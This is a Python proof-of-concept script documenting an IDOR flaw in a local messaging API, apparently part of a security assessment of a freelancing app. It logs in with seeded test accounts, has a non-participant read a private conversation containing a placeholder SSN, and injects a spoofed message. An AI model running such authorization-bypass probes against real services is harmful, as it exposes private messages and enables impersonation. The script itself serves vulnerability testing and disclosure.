#!/usr/bin/env python3
"""
WSTG-ATHZ-04: Messaging IDOR (Insecure Direct Object Reference)

Vulnerability: The messaging API endpoints authenticate users but never verify
that the authenticated user is a participant in the conversation.

- GET /api/messages/conversations/:id - any authenticated user can read any
  conversation's messages, including private messages between other users.
- POST /api/messages/conversations/:id/messages - any authenticated user can
  inject messages into any conversation, impersonating a legitimate participant.

The controller (messaging.controller.js) passes req.params.id directly to the
service layer without checking conversation membership. The service layer
(messaging.service.js) queries messages by conversation_id only, without
filtering by the requesting user's participation.

Impact: Complete breach of messaging privacy. Any authenticated user can read
all private conversations and inject spoofed messages.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"

CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]
FREELANCER_ACCOUNTS = [
    {"email": "testfreelancer@hireflow.com", "password": "password123"},
    {"email": "priya.sharma@gmail.com", "password": "password123"},
    {"email": "james.oconnor@outlook.com", "password": "password123"},
]
ADMIN_ACCOUNTS = [
    {"email": "bob.admin@hireflow.com", "password": "password123"},
    {"email": "alice.admin@hireflow.com", "password": "password123"},
]


def try_login(accounts, role_label="user"):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            data = resp.json()
            return data["token"], data["user"]
    print(f"    ERROR: No {role_label} account could be logged in.")
    sys.exit(1)


def main():
    print("=" * 70)
    print("WSTG-ATHZ-04: Messaging IDOR - Read/Inject Messages in Any Conversation")
    print("=" * 70)

    # Step 1: Login as all users
    print("\n[1] Logging in as three users...")
    client_token, client_user = try_login(CLIENT_ACCOUNTS, "client")
    print(f"    Client:     {client_user['email']} (id: {client_user['id'][:8]}...)")

    freelancer_token, freelancer_user = try_login(FREELANCER_ACCOUNTS, "freelancer")
    print(f"    Freelancer: {freelancer_user['email']} (id: {freelancer_user['id'][:8]}...)")

    admin_token, admin_user = try_login(ADMIN_ACCOUNTS, "admin")
    print(f"    Admin:      {admin_user['email']} (id: {admin_user['id'][:8]}...)")

    client_headers = {"Authorization": f"Bearer {client_token}"}
    freelancer_headers = {"Authorization": f"Bearer {freelancer_token}"}
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    # Step 2: List client's conversations
    print("\n[2] Listing client's conversations...")
    resp = requests.get(f"{BASE_URL}/api/messages/conversations", headers=client_headers)
    if resp.status_code != 200:
        print(f"    Failed: {resp.status_code}")
        # Create a conversation between client and freelancer
        print("    Creating a conversation between client and freelancer...")
        resp = requests.post(
            f"{BASE_URL}/api/messages/conversations",
            json={
                "participant_ids": [client_user["id"], freelancer_user["id"]],
                "subject": "Test IDOR Conversation",
                "message": "This is a private message from client to freelancer."
            },
            headers=client_headers
        )
        if resp.status_code not in (200, 201):
            print(f"    Failed to create conversation: {resp.status_code} {resp.text[:200]}")
            sys.exit(1)
        conv = resp.json()
        target_conv_id = conv.get("id")
        print(f"    Created conversation: {target_conv_id}")
    else:
        conversations = resp.json().get("conversations", [])
        print(f"    Client has {len(conversations)} conversation(s)")

        if conversations:
            target_conv_id = conversations[0]["id"]
            print(f"    Target conversation: {target_conv_id}")
            participants = conversations[0].get("participants", [])
            print(f"    Participants: {[p.get('display_name', 'Unknown') for p in participants]}")
        else:
            # Create one
            print("    No conversations found, creating one...")
            resp = requests.post(
                f"{BASE_URL}/api/messages/conversations",
                json={
                    "participant_ids": [client_user["id"], freelancer_user["id"]],
                    "subject": "Test IDOR Conversation",
                    "message": "This is a private message for IDOR testing."
                },
                headers=client_headers
            )
            conv = resp.json()
            target_conv_id = conv.get("id")
            print(f"    Created conversation: {target_conv_id}")

    # Step 3: Send a private message in the conversation (from client)
    print("\n[3] Client sends a private message in the conversation...")
    resp = requests.post(
        f"{BASE_URL}/api/messages/conversations/{target_conv_id}/messages",
        json={"content": "CONFIDENTIAL: My SSN is 123-45-6789. Do not share this."},
        headers=client_headers
    )
    if resp.status_code in (200, 201):
        print("    Private message sent successfully.")
    else:
        print(f"    Message send status: {resp.status_code}")

    # Step 4: Admin (not a participant) reads the conversation - IDOR
    print(f"\n[4] Admin (NOT a participant) reads conversation {target_conv_id[:8]}...")
    resp = requests.get(
        f"{BASE_URL}/api/messages/conversations/{target_conv_id}",
        headers=admin_headers
    )
    print(f"    Status: {resp.status_code}")

    if resp.status_code == 200:
        messages = resp.json().get("messages", [])
        print(f"    [VULNERABLE] Admin read {len(messages)} message(s) from private conversation!")
        for msg in messages[:5]:
            sender = msg.get("sender_name", msg.get("sender_username", "Unknown"))
            content = msg.get("content", "")[:80]
            print(f"    - [{sender}]: {content}")
    else:
        print(f"    Access denied. Response: {resp.text[:200]}")

    # Step 5: Admin injects a message into the conversation - IDOR
    print(f"\n[5] Admin injects a message into the private conversation...")
    resp = requests.post(
        f"{BASE_URL}/api/messages/conversations/{target_conv_id}/messages",
        json={"content": "INJECTED: This message was sent by the admin who is NOT in this conversation."},
        headers=admin_headers
    )
    print(f"    Status: {resp.status_code}")

    if resp.status_code in (200, 201):
        injected = resp.json()
        print(f"    [VULNERABLE] Message injected successfully!")
        print(f"    Message ID: {injected.get('id', 'N/A')}")
        print(f"    Sender ID: {injected.get('sender_id', 'N/A')}")
        print(f"    Content: {injected.get('content', 'N/A')[:80]}")
    else:
        print(f"    Injection denied. Response: {resp.text[:200]}")

    # Step 6: Verify the injected message appears in the conversation
    print(f"\n[6] Verifying injected message is visible to conversation participants...")
    resp = requests.get(
        f"{BASE_URL}/api/messages/conversations/{target_conv_id}",
        headers=client_headers
    )
    if resp.status_code == 200:
        messages = resp.json().get("messages", [])
        for msg in messages:
            if "INJECTED" in msg.get("content", ""):
                print(f"    [CONFIRMED] Injected message visible to legitimate participants!")
                print(f"    Sender shown as: {msg.get('sender_name', 'N/A')}")
                break

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: Messaging IDOR confirmed.")
    print("  - Any authenticated user can read any conversation's messages")
    print("  - Any authenticated user can inject messages into any conversation")
    print("  - No verification of conversation membership in the controller")
    print("=" * 70)


if __name__ == "__main__":
    main()
